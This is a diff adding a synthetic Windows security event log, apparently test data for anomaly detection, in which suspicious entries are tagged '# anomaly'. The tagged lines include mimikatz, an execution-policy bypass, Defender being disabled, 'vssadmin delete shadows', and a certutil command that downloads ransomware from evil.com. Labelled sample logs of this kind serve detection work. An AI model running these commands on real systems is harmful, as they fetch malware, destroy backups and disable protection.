@@ -1,0 +1,33 @@
+2024-09-15 00:00:01 EventID:4624 Level:Information Source:Security Successful login for user 'krishna' from 192.168.1.12
+2024-09-15 00:05:20 EventID:4634 Level:Information Source:Security Logoff for user 'krishna'
+2024-09-15 01:10:11 EventID:4624 Level:Information Source:Security Successful login for user 'john' from 192.168.1.30
+2024-09-15 01:12:01 EventID:4624 Level:Information Source:Security Successful login for user 'rkumar' from 192.168.1.85
+2024-09-15 01:13:11 EventID:4634 Level:Information Source:Security Logoff for user 'rkumar'
+2024-09-15 02:14:01 EventID:4624 Level:Information Source:Security Successful login for user 'admin' from 10.0.0.99
+2024-09-15 02:14:55 EventID:4625 Level:Warning Source:Security Failed login attempt for user 'admin' from 192.168.100.50   # anomaly
+2024-09-15 02:15:20 EventID:4634 Level:Information Source:Security Logoff for user 'admin'
+2024-09-15 02:15:32 EventID:4625 Level:Warning Source:Security Failed login attempt for user 'administrator' from 192.168.100.50   # anomaly
+2024-09-15 02:16:03 EventID:4624 Level:Information Source:Security Successful login for user 'jsmith' from 192.168.100.50   # anomaly
+2024-09-15 03:01:21 EventID:4720 Level:Information Source:Security User account created: tempuser
+2024-09-15 03:23:45 EventID:4688 Level:Information Source:Security New process created: powershell.exe Set-ExecutionPolicy Bypass  # anomaly
+2024-09-15 04:12:11 EventID:4688 Level:Information Source:Security New process created: notepad.exe
+2024-09-15 05:09:41 EventID:4688 Level:Information Source:Security New process created: winword.exe
+2024-09-15 06:00:00 EventID:7045 Level:Information Source:System Service created: WindowsUpdateService
+2024-09-15 07:00:01 EventID:4688 Level:Information Source:Security New process created: python.exe backup.py
+2024-09-15 08:00:12 EventID:4672 Level:Warning Source:Security Special privileges assigned to new logon (admin rights granted)   # anomaly
+2024-09-16 14:30:22 EventID:4688 Level:Information Source:Security New process created: mimikatz.exe    # anomaly
+2024-09-16 16:02:33 EventID:4688 Level:Information Source:Security New process created: excel.exe
+2024-09-16 17:21:43 EventID:4689 Level:Information Source:Security Process exited: excel.exe (PID 1234)
+2024-09-17 03:45:12 EventID:5140 Level:Information Source:Security Network share accessed \\SERVER2\\C$ from 192.168.100.50   # anomaly
+2024-09-17 04:20:10 EventID:4624 Level:Information Source:Security Successful login for user 'sapna' from 192.168.1.15
+2024-09-17 05:01:55 EventID:4688 Level:Information Source:Security New process created: winword.exe
+2024-09-18 22:10:45 EventID:4688 Level:Information Source:Security New process created: wmic.exe process call create   # anomaly
+2024-10-25 04:15:20 EventID:7040 Level:Warning Source:System Windows Defender service disabled   # anomaly
+2024-10-25 04:16:33 EventID:4688 Level:Information Source:Security New process created: vssadmin.exe delete shadows /all /quiet   # anomaly
+2024-10-25 04:18:45 EventID:4688 Level:Information Source:Security New process created: calc.exe
+2024-10-25 06:12:09 EventID:4698 Level:Information Source:Security Scheduled task created: DailyBackup
+2024-12-20 05:30:15 EventID:4688 Level:Information Source:Security New process created: certutil.exe -urlcache -split -f http://evil.com/ransomware.exe  # anomaly
+2024-12-20 05:32:40 EventID:11 Level:Critical Source:Sysmon File created: C:\Users\Public\ransomware.exe   # anomaly
+2024-12-20 05:35:22 EventID:4688 Level:Critical Source:Security New process created: ransomware.exe --encrypt-all --extension .locked   # anomaly
+2024-12-20 07:00:01 EventID:4688 Level:Information Source:Security New process created: explorer.exe
+2024-12-20 09:40:01 EventID:4688 Level:Information Source:Security New process created: mstsc.exe /v:192.168.1.15
